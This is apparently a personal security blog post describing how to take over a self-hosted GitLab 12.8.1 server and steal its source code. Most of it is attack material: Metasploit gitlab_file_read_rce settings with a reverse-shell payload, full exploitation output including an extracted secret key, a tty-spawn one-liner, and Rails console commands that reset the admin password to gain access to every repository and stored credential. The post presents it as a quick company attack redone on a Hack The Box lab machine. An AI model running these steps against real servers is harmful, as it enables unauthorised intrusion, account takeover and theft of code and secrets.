---
layout: default
---

### Steal project Source Code in 60 seconds

----------

![title](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/title.jpg)

----------

The journey starts with Company Gitlab CI with open register functional that i got from the rsource company list , Gitlab is self hosted on barametal hosting. The Current version of the gitlab-ce is vulnerable to LFI and RCE exploiting the RCE and getting initial shell in a server , Changing the admin account with github-rails console and login as him on gitlab. Got the private credentials. keys in a project-repo.

For notes used test env as HTB Machine - Laboratory because real env under NDA.

####  Gitlab CI resource

And i can see that Gitlab is hosted. I saw open Register function and Try do it!

----------

![register](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/register.jpg)

----------

Now i registered myself as oleksii and logged in

----------

![login](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/login.jpg)

----------

Didn’t see anything good and juicy then i just go to `https://gitlab.site.io/help`

----------

![version](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/version.jpg)

----------

So its 12.8.1 , so searched a bit about it on google and got so many CVEs. And on rapid7.com site saw info about vulnerabilities, it was disclosed few months ago (Created 12/10/2020) and was about LFI & RCE. The RCE only affects versions 12.4.0 and above when the vulnerable `experimentation_subject_id` cookie was introduced. Tested on GitLab 12.8.1 and 12.4.0.

This picture in Company Gitlab CI says a lot:)

----------

![asap](https://m1sn1k.github.io/blog/Steal-project-source-code-in-60-seconds/asap.jpg#center)

----------

#### RCE in the gitlab

Now i can that i exploitetion RCE using msfconsole tool `https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce` because exploit was development and added it to exploit list. 

```
msf6 exploit(multi/http/gitlab_file_read_rce) > use exploit/multi/http/gitlab_file_read_rce
msf6 exploit(multi/http/gitlab_file_read_rce) > show options 

Module options (exploit/multi/http/gitlab_file_read_rce):

   Name             Current Setting                                               
   ----             ---------------                                               
   USERNAME         oleksii@test.test                                             
   PASSWORD         oleksii@test.test                                             
   RHOSTS           10.10.10.*                                                         
   RPORT            443                                                           
   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
   TARGETURI        /users/sign_in                                                
   VHOST            gitlab.site.io                                                

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.*       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

Exploitation RCE vulnerability: 

```
[*] Started reverse TCP handler on 10.10.14.**:2222 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
[*] Logged in to user oleksii
[*] Created project /oleksii/irUhEXC3
[*] Created project /oleksii/Dq5g60ow
[*] Created issue /oleksii/irUhEXC3/issues/1
[*] Executing arbitrary file load
[+] File saved as: '/root/.msf4/loot/20210102160557_default_10.10.10.*_gitlab.secrets_454778.txt'
[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[*] Attempting to delete project /oleksii/irUhEXC3
[*] Deleted project /oleksii/irUhEXC3
[*] Attempting to delete project /oleksii/Dq5g60ow
[*] Deleted project /oleksii/Dq5g60ow
[*] Command shell session 3 opened (10.10.14.*:2222 -> 10.10.10.*:50878) at 2021-01-02 16:06:02 -0500

ls -la
total 8
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Jan  2 20:41 ..
python3 -c 'import pty; pty.spawn("/bin/sh")'

$ls -la
drwx------ 2 git root 4096 Jul  2  2020 .
drwxr-xr-x 9 git root 4096 Jan  2 20:41 ..

```

Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

#### Resetting admin password

Now since the gitlab is installed i can spawn a gitlab-rails console and reset the admin password , and check who is admin. Resetting admin password offical document link `https://docs.gitlab.com/12.10/ee/security/reset_root_password.html`

Used command from this doc I could reset admin password. Start a Ruby on Rails console with this command:
```
 gitlab-rails console -e production
```
Wait until the console has loaded.

There are multiple ways to find your user. You can search for email or username.
```
  user = User.where(id: 1).first
```
Found Gitlab admin user:

```
irb(main):008:0> user = User.where(id: 1).first
user = User.where(id: 1).first
=> #<User id:1 @dexter>
```

or

Other type get username and email without Gitlab authentification is use api `https://gitlab.site.io/api/v4/users/1`

```
{
  "id": 1,
  "name": "Dexter McPherson",
  "username": "dexter",
  "state": "active",
  "avatar_url": "http://gitlab.site.iouploads/-/system/user/avatar/1/avatar.png",
  "web_url": "http://gitlab.site.io/dexter",
  "created_at": "2020-07-02T18:02:18.859Z",
  "bio": "",
  "location": "",
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": ""
}
```

Now you can change your password:

```
 user.password = 'secret_pass'
 user.password_confirmation = 'secret_pass'
```

It’s important that you change both password and password_confirmation to make it work.

Don’t forget to save the changes.

```
 user.save!
```
Exit the console and try to login with your new password.

#### Login as admin on gitlab

Now can login as admin - dexter : secret_pass and can see all repos with credentials and keys. 

So now see how can steal project Source code in 60 seconds because I think If you repeat all command from this notes then spend no more than 60 second. 

 